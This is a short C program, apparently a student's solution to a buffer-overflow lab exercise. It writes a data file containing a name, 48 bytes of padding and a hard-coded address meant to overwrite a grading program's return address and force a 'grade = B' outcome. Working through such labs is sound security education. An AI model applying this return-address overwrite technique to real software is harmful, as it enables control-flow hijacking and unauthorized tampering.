#include <stdio.h>
#include <string.h>
/* creates file dataB with more than 48 bytes for the name. 
This overwrites the return address and changes it to the return
 address of the grade = B command */
int main() {
    FILE *psFile;
    int i = 0;
    unsigned long ul = 0x400858;
    
    /* My name*/
    char* name = "Stephen Elliott";
    psFile = fopen("dataB", "w");
    /* writes my name to the file */
    fprintf(psFile, "%s", name);
    /*fills remaining space with zeroes */
    for (i = strlen(name); i < 48; i++){
        fprintf(psFile,  "%c", '\0');
    }
    /* address of grade = B*/
    fwrite(&ul, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    return 1;
}